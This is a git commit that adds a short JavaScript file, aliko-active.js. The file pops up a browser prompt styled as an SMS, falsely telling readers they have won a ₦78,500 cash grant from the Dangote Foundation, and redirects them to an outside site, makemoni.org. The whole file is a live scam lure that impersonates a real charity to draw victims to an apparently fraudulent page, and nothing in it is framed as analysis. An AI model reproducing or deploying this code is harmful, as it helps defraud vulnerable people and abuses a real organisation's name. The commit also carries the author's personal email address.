268733c87d9509fc3322f48c193b3d1484e5b473
bestplugg <nsiukpe247@gmail.com>
2025-07-18 09:36:13 +0100

    Create aliko-active.js

---
+++ aliko-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦78,500'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦78,500 Cash Grant from Dangote Foundation, Press Ok to withdraw cash Now ','WITHDRAW ₦78,500');
+if (password != 'WITHDRAW ₦78,500') {
+location.href='https://makemoni.org/dangote.html';
+}
